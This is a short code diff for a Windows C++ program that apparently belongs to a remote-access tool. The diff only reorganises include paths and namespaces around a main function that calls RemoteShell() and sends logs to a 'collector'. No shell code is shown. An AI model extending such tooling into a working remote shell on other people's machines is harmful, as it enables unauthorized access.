@@ -1,13 +1,13 @@
 #include <winsock2.h>
-#include <common/Log.hpp>
-#include <Innocence.hpp>
+#include <log/Log.hpp>
+#include <common/Innocence.hpp>
 
 void RemoteShell();
 
 int main(int argc, char * argv[])
 {
-	LOG.setIdentity(Innocence::identity);
-    LOG.addObserver(new Common::LogToCollector);
+	LOG.setIdentity(Common::identity);
+    LOG.addObserver(new Log::LogToCollector);
 	try
 	{
 		RemoteShell();
